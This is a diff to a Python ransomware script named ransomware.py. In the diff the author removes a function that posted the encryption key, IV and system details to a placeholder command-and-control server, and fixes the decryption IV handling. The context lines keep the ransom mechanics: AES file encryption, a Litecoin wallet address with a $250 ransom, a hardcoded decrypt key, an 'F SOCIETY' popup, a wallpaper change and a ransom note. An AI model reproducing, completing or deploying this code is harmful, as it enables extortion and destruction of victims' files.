@@ -1,7 +1,5 @@
 import os
 import base64
-import json
-import requests
 import ctypes
 import subprocess
 import sys
@@ -10,12 +8,10 @@ from Crypto.Util.Padding import pad, unpad
 from Crypto.Random import get_random_bytes
 import winreg
 import time
-import threading
 import shutil
 import re
 
 # Configuration
-C2_SERVER = "https://your-c2-server.com/report"
 LTC_ADDRESS = "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz"
 RANSOM_AMOUNT = "$250 USD in Litecoin"
 DECRYPT_KEY = "agent77"
@@ -41,9 +37,9 @@ def encrypt_file(file_path, key, iv):
 def decrypt_file(file_path, key, iv):
     try:
         with open(file_path, 'rb') as f:
-            iv = f.read(16)
+            iv_data = f.read(16)
             encrypted_data = f.read()
-        cipher = AES.new(key, AES.MODE_CBC, iv)
+        cipher = AES.new(key, AES.MODE_CBC, iv_data)
         decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
         original_path = file_path.replace('.encrypted', '')
         with open(original_path, 'wb') as f:
@@ -219,21 +215,6 @@ python ransomware.py --decrypt agent77
         except:
             pass
 
-def send_to_c2(key_hex, iv_hex, file_count, system_info):
-    try:
-        payload = {
-            'key': key_hex,
-            'iv': iv_hex,
-            'files_encrypted': file_count,
-            'system': system_info,
-            'ltc_address': LTC_ADDRESS,
-            'decrypt_key': DECRYPT_KEY,
-            'timestamp': time.time()
-        }
-        requests.post(C2_SERVER, json=payload, timeout=5)
-    except:
-        pass
-
 def show_popup():
     ctypes.windll.user32.MessageBoxW(0, 
         "YOUR FILES HAVE BEEN ENCRYPTED BY F SOCIETY\n\n"
@@ -269,7 +250,7 @@ def main():
                 "F SOCIETY", 0x10)
             sys.exit(1)
     
-    # Encryption mode - no global variables needed
+    # Encryption mode
     try:
         key = generate_key()
         iv = generate_iv()
@@ -289,9 +270,6 @@ def main():
         
         change_wallpaper()
         create_ransom_note(key_hex, iv_hex)
-        
-        system_info = f"{os.name} {sys.platform} {os.environ.get('COMPUTERNAME', 'Unknown')}"
-        send_to_c2(key_hex, iv_hex, total_encrypted, system_info)
         
         show_popup()
         
